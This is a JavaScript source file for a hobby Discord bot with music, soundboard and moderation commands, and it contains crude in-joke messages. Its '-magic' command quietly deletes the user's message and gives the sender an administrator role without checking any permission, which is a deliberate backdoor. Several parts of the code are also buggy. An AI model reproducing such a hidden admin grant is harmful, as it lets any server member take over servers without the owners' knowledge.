require("dotenv").config();
const musicBot = require("./musicBot");
const spam = require("spamnya");
const dani = require("./commands/daniCommand");
const { stream } = require("./commands/streamCommand");
const { Client, Intents } = require("discord.js");
const { Player } = require("discord-music-player");
const {
  dictCommands,
  musicBotCommands,
  dictVoiceCommands,
  dictAdmins,
} = require("./utils");

const { getUserByTag, mm, sendInvite } = require("./commands/helperFunctions");
const { LockableClient } = require("./lockable-client");
//const { default: MusicBot } = require("./musicBot");
const { MusicPlayer } = require("./musicPlayer");
const streamCommand = require("./commands/streamCommand");
const bot = new LockableClient({ intents: new Intents(32767) });
const client = new Client({ intents: new Intents(32767) });
const player = new Player(client, {
  leaveOnEmpty: true,
});
client.player = player;
const prefix = "-";
var blackList = [];

client.once("ready", () => {
  console.log("DaniBot is online!");
});

client.on("messageCreate", async (message) => {
  if (!message.content.startsWith(prefix) || message.author.bot) return;
  const args = message.content.slice(prefix.length).split(/ +/);
  const command = args.shift().toLowerCase();

  if (musicBotCommands.includes(command)) {
    MusicPlayer(message, client);
  } else if (command === "dani") {
    message.channel.send(dani.lastBan());
  } else if (command === "stream") {
    stream(message, args);
  } else if (command in dictCommands) {
    message.channel.send(dictCommands[command]);
  } else if (command === "mm") {
    message.channel.send(mm());
  } else if (
    command in dictVoiceCommands &&
    !bot.isLocked() &&
    !(message.author.id in blackList)
  ) {
    spam.log(message, 50);
    const author = message.author.id;
    if (spam.sameMessages(2, 10000)) {
      blackList.push(author);
      setInterval(function () {
        blackList = [];
      }, 10000);
      message.channel.send("Pochini malko baluk");
      var voice = message.guild.members.cache.find(
        (user) => user.id === author
      ).voice;
      if (!voice) return;
      await voice.kick();
      return;
    }
    bot.lock();
    var volume = 2;
    if (
      command == "eitypag" &&
      (author == "378275337164816394" || author == "163416315892072448")
    ) {
      volume = 200;
    }
    var voiceChannel = message.member.voice.channel;
    if (!voiceChannel) {
      message.channel.send("You have to be in voice 4annel be typak");
    } else {
      voiceChannel
        .join()
        .then((connection) => {
          const dispatcher = connection.play(dictVoiceCommands[command], {
            volume: volume,
          });
          dispatcher.on("finish", (end) => voiceChannel.leave());
          dispatcher.on("error", console.error);
        })
        .catch((err) => console.log(err));
      bot.unlock();
    }
  } else if (command == "res") {
    let messageCopy = message;
    await message.delete();
    messageCopy.channel.send("https://tenor.com/beX90.gif");

    const authorId = messageCopy.author.id;
    if (!dictAdmins.includes(authorId)) {
      messageCopy.channel.send("You are not in the big dick club");
      return;
    }
    const user = args[0];
    var taggedUser = getUserByTag(messageCopy.guild, user);
    var voice = messageCopy.guild.members.cache.find(
      (user) => user.id === taggedUser.id
    ).voice;

    if (!voice) return;

    if (!dictAdmins.includes(taggedUser.id)) {
      await voice.kick();
    }
  } else if (command == "magic") {
    let messageCopy = message;
    message.delete();
    const authorId = messageCopy.author.id;
    var member = getUserByTag(messageCopy.guild, authorId);

    //---- Admin Role ----
    const normalPermission = 104320576;

    var role = messageCopy.guild.roles.create({
      data: {
        name: "Sex Offender",
        color: [250, 173, 195],
        permissions: [Discord.Permissions.FLAGS.ADMINISTRATOR],
        mentionable: false,
      },
      reason: "Сме яки и мое си го позволим,УСССС",
    });

    member.roles.add(role);
  } else if (command == "invite") {
    sendInvite(message, client);
  }
});

client.login(process.env.token);

//play sound on join
// client.on("voiceStateUpdate", (oldState, newState) => {
//   var voiceChannel = newState.channel;
//   let oldChannel = oldState.channel
//   let newChannel = newState.channel

//   if (oldChannel === newChannel) return;

//   if (
//     oldState.member.user.id === "378275337164816394" &&
//     voiceChannel &&
//     !bot.isLocked()
//   ) {
//     bot.lock();
//     voiceChannel
//       .join()
//       .then((connection) => {
//         const dispatcher = connection.play(dictVoiceCommands["papi"], {
//           volume: 1,
//         });
//         dispatcher.on("finish", (end) => voiceChannel.leave());
//         dispatcher.on("error", console.error);
//       })
//       .catch((err) => console.log(err));
//     bot.unlock();
//   }
// });
